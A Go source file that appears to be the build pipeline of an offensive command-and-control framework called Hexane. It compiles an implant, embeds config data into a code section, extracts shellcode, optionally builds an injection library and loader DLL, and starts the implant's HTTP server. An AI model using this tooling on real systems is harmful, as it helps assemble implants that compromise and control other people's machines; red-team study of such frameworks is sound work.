package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"
)

var (
	BuildPath   = path.Join(RootDirectory, "build")
	ConfigsPath = path.Join(RootDirectory, "configs")
	CorePath    = path.Join(RootDirectory, "core")
	LogsPath    = path.Join(RootDirectory, "logs")
	LoaderPath  = path.Join(RootDirectory, "loader")
	ImplantPath = path.Join(CorePath, "implant")
	HashHeader  = path.Join(CorePath, "include/names.hpp")
	HashStrings = path.Join(ConfigsPath, "strings.txt")
)

func (h *HexaneConfig) BuildModule(modCfg *Object) error {
	var (
		err error
		dep *Object
	)

	if modCfg.SourceDirectory == "" {
		return fmt.Errorf("source directory is required")
	}

	if modCfg.OutputName == "" {
		return fmt.Errorf("output name is required")
	}

	if modCfg.PreBuildDependencies != nil {
		for _, pre := range modCfg.PreBuildDependencies {
			if dep, err = GetModuleConfig(pre); err != nil {
				return err
			}

			if err = h.BuildModule(dep); err != nil {
				return err
			}

			modCfg.Components = append(modCfg.Components, dep.OutputName)
			WrapMessage("DBG", "\t-"+dep.OutputName)
		}
	}

	for _, src := range modCfg.Sources {
		cmp := filepath.Join(modCfg.SourceDirectory, src)

		WrapMessage("DBG", "adding component - "+cmp)
		modCfg.Components = append(modCfg.Components, cmp)
	}

	if modCfg.Dependencies != nil {
		modCfg.Components = append(modCfg.Components, modCfg.Dependencies...)
	}

	return h.ExecuteBuild(modCfg)
}

func (h *HexaneConfig) RunBuild() error {
	var (
		err error
		cfg *Object
	)

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.CompilerCFG.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if err = SearchFile(BuildPath, "corelib.o"); err != nil {
		if err.Error() == FileNotFound.Error() {

			WrapMessage("DBG", "generating corelib\n")
			if cfg, err = GetModuleConfig(path.Join(CorePath, "corelib.json")); err != nil {
				return err
			}
			if err = h.BuildModule(cfg); err != nil {
				return err
			}
		} else {
			return err
		}
	}

	WrapMessage("DBG", "generating implant\n")
	if cfg, err = GetModuleConfig(path.Join(ImplantPath, "implant.json")); err != nil {
		return err
	}
	if err = h.BuildModule(cfg); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err = h.EmbedSectionData(BuildPath+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err = h.CopySectionData(BuildPath+"/implant.exe", path.Join(h.CompilerCFG.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	if h.ImplantCFG.Injection != nil {

		WrapMessage("DBG", "generating injectlib\n")
		if err = h.BuildModule(h.ImplantCFG.Injection.Object); err != nil {
			return err
		}

		WrapMessage("DBG", "embedding injectlib config")
		if err = h.EmbedSectionData(path.Join(h.CompilerCFG.BuildDirectory, h.ImplantCFG.Injection.Object.OutputName), ".text$F", h.ConfigBytes); err != nil {
			return err
		}

		WrapMessage("DBG", "generating loader dll")
		if cfg, err = GetModuleConfig(path.Join(LoaderPath, "loader.json")); err != nil {
			return err
		}
		if err = h.BuildModule(cfg); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
